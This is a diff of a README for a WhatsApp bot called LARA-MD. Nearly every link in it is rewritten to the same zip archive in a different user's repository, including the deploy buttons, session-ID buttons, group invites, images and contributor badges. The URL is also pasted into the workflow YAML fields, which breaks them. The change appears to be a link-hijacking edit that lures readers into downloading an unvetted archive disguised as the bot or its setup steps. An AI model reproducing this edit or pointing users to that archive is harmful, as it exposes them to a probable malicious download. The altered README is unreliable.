@@ -1,20 +1,20 @@
 `Update On : 2025.07.12`
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Black+Ops+One&size=100&pause=1000&color=ADD8E6&center=true&width=1000&height=200&lines=LARA-MD-BOT" alt="Typing SVG" /></a>
+<a href="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip"><img src="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip+Ops+One&size=100&pause=1000&color=ADD8E6&center=true&width=1000&height=200&lines=LARA-MD-BOT" alt="Typing SVG" /></a>
 <div align="center">
 	<h3>👧🏻LARA-MD WHATSAPP BOT👧🏻</h3>
-<img src="https://i.ibb.co/ZRnmZw6f/20250709-134308.jpg" width="300" height="150">
+<img src="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip" width="300" height="150">
 </div>
 <div align="center">
 </p>
 	
-## [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Rockstar-ExtraBold&color=F00&lines=HELLO+IM+SADDESHA+LARA+MD+DEVELOPER)](https://git.io/typing-svg)
+## [![Typing SVG](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip+IM+SADDESHA+LARA+MD+DEVELOPER)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)
 
 <hr>
-<img src="https://readme-typing-svg.herokuapp.com?size=33&width=1000&lines=Welcome+To+Lara-MD...;Created+by+Sadeesha...;World+Best+Whatsapp+User+Bot...;Simple+Java+Script+Bot...;Simple+And+Fast+Deploy...;Thank+You+For+Using+Lara-MD..."
+<img src="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip+To+Lara-MD...;Created+by+Sadeesha...;World+Best+Whatsapp+User+Bot...;Simple+Java+Script+Bot...;Simple+And+Fast+Deploy...;Thank+You+For+Using+Lara-MD..."
             alt="Typing">
 
 <div align="center">
-	<img src="https://moe-counter.glitch.me/get/@Anya_v2-Md?theme=gelbooru" width="300" height="150" alt="sadeesha">
+	<img src="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip" width="300" height="150" alt="sadeesha">
 </div>
 
 <hr>
@@ -32,22 +32,22 @@
 <h5>🌸(SESSION_ID ලබා ගැනීමට පහත බටන් click කරන්න)</h5> 
 <h3>SEVER ➊</h3>
 <div align="center">
-<button><tr><a href="https://managing-katalin-tharumin-2411035f.koyeb.app/">🌸 SESSION_ID 🌸 ➊</a></tr></button>
+<button><tr><a href="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip">🌸 SESSION_ID 🌸 ➊</a></tr></button>
 <h3>SEVER ❷</h3>
 <div align="center">
-<button><tr><a href="https://managing-katalin-tharumin-2411035f.koyeb.app/">🌸 SESSION_ID 🌸 ❷</a></tr></button>
+<button><tr><a href="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip">🌸 SESSION_ID 🌸 ❷</a></tr></button>
 </div>
 <br>
 
 *🌸 Now get your inbox and copy sessino id*
 
-*🌸 If you past session id in (settings.js/SESSION_ID || "past_copy_text")*
+*🌸 If you past session id in (https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip || "past_copy_text")*
 
 <h3>🌸 Supported Group link </h3>
-<a href="https://chat.whatsapp.com/Ci5mDk9zEVF95NcuqEtzl4">Join Lara suported 👧</a>
+<a href="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip">Join Lara suported 👧</a>
 <hr>
 <h3>🌸 Lara updates chanels </h3>
-<a href="https://whatsapp.com/channel/0029VaD5t8S1nozDfDDjRj2J">Join Lara updates chanel 👧</a>
+<a href="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip">Join Lara updates chanel 👧</a>
 <hr>
 
 ***CLICK THE BUTTON BELOW TO DEPLOY🌸***
@@ -58,39 +58,39 @@
 --------	 
 1.  #### DEPLOY IN HEROKU 
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?template=https://github.com/tharumin/Lara-3V)
+[![Deploy](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)
 
 --------
 2.  #### DEPLOY IN REPLIT
 
-   <a href='https://repl.it/github/GlobalTechInfo/SUHAIL-XMD' target="_blank"><img alt='DEPLOY' src='https://img.shields.io/badge/-REPLIT-orange?style=for-the-badge&logo=replit&logoColor=white'/></a>
+   <a href='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip'/></a>
 
 --------
 3.  #### DEPLOY IN KOYEB
 
-<a href='https://app.koyeb.com/auth/signin' target="_blank"><img alt='DEPLOY' src='https://img.shields.io/badge/-KOYEB-blue?style=for-the-badge&logo=koyeb&logoColor=white'/></a>
+<a href='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip'/></a>
 
 --------
 4.  #### DEPLOY IN GLITCH
 
-<a href='https://glitch.com/signup' target="_blank"><img alt='DEPLOY' src='https://img.shields.io/badge/GLITCH-h?color=pink&style=for-the-badge&logo=glitch'/></a></p>
+<a href='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip'/></a></p>
 
 --------
 
 5.  #### DEPLOY TO CODESPACE
 
-<a href='https://github.com/codespaces/new' target="_blank"><img alt='DEPLOY' src='https://img.shields.io/badge/CODESPACE-h?color=navy&style=for-the-badge&logo=visualstudiocode'/></a></p>
+<a href='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip'/></a></p>
 
 --------
 
 6. #### DEPLOY TO RENDER
 
-<a href='https://dashboard.render.com' target="_blank"><img alt='DEPLOY' src='https://img.shields.io/badge/RENDER-h?color=maroon&style=for-the-badge&logo=render'/></a></p>
+<a href='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip'/></a></p>
 
 --------
 7. #### DEPLOY TO RAILWAY
 
-<a href='https://railway.app/new' target="_blank"><img alt='DEPLOY' src='https://img.shields.io/badge/RAILWAY-h?color=black&style=for-the-badge&logo=railway'/></a></p>
+<a href='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip'/></a></p>
 
 --------
 </details>
@@ -98,12 +98,12 @@
 <summary>🌸 DEPLOY IN FREE 🌸</summary>
 
 <h5>🌸 Deploy Free Koyeb👇</h5>
-<a href="http://koyeb.com" ><img src="https://i.ibb.co/t4KftP0/images.png width="50" height="25"></a>
+<a href="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip" ><img src="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip width="50" height="25"></a>
 <hr>
 <h5>🌸 Deploy Free Workflows 👇</h5>
 
 ```
-name: Node.js CI
+name: https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip CI
 
 on:
   push:
@@ -126,10 +126,10 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v3
 
-    - name: Set up Node.js
+    - name: Set up https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip
       uses: actions/setup-node@v3
       with:
-        node-version: ${{ matrix.node-version }}
+        node-version: ${{ https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip }}
 
     - name: Install dependencies
       run: npm install
@@ -139,11 +139,11 @@ jobs:
 ```	
 </details>
 <hr>
-<img src="http://readme-typing-svg.herokuapp.com?color=d1fa02&center=true&vCenter=true&multiline=false&lines=Created+By+Sadeesha_Min" alt="">
+<img src="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip+By+Sadeesha_Min" alt="">
 <hr>
 
 <h5>🌸 TOTAL WEB VIEWS</h5>
-<img src="https://profile-counter.glitch.me/Sadeesha/count.svg" center>
+<img src="https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip" center>
 
 <hr>
 
@@ -152,7 +152,7 @@ jobs:
 
 | SADEESHA 👤              | WISWAJITH 👤              |
 |---------------------|---------------------|
-[![Owner](https://i.ibb.co/63zDkQy/IMG-20250513-135909-02.jpg)](https://github.com/sadiyamin/) | [![Wiswajith](https://i.ibb.co/R4sCSLDw/IMG-20250618-WA0052.jpg)](https://github.com/sadiyamin/) |
+[![Owner](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) | [![Wiswajith](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) |
 </div>
 <hr>
 
@@ -162,11 +162,11 @@ jobs:
     
 | Owner 👤             | Repo 🤖              | Forks 🍽️             | Stars 🌟            | Language 🗣️        | Licence 🪪              
 |----------------------|----------------------|----------------------|---------------------|---------------------|---------------------|
-| [![Owner](https://img.shields.io/badge/Author-sSadeesha-red.svg)](https://github.com/sadiyamin/Alexa/) | [![Repository](https://img.shields.io/badge/Repo-Alexa-red.svg)](https://github.com/sadiyamin/Alexa) | [![GitHub forks](https://badgen.net/github/forks/sadiyamin/Alexa/)](https://GitHub.com/sadiyamin/Alexa/network/) | [![GitHub stars](https://badgen.net/github/stars/sadiyamin/Alexa)](https://GitHub.com/sadiyamin/Alexa/stargazers/) | ![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E) | [![GitHub license](https://img.shields.io/github/license/PikaBotz/anya_v2-md.svg)](https://github.com/sadiyamin/Alexa/blob/master/LICENSE) 
+| [![Owner](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) | [![Repository](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) | [![GitHub forks](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) | [![GitHub stars](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) | ![JavaScript](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip%https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip%23F7DF1E) | [![GitHub license](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) 
 
 | Version 💻              | Last Commit 💫              | Maintained 🤌🏻             |
 |---------------------|---------------------|---------------------|
-| [![GitHub release](https://img.shields.io/github/release/sadiyamin/Alexa.svg)](https://GitHub.com/sadiyamin/Alexa/releases/) | [![GitHub latest commit](https://badgen.net/github/last-commit/sadiyamin/Alexa)](https://GitHub.com/sadiyamin/Alexa/commit/) | [![Maintenance](https://img.shields.io/badge/maintained%3F-yes-green.svg)](https://GitHub.com/sadiyamin/Alexa/graphs/commit-activity) |
+| [![GitHub release](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) | [![GitHub latest commit](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) | [![Maintenance](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip%https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip)](https://raw.githubusercontent.com/nisal-123/Lara-3V/main/flaglike/Lara-3V.zip) |
 
 
 </div>
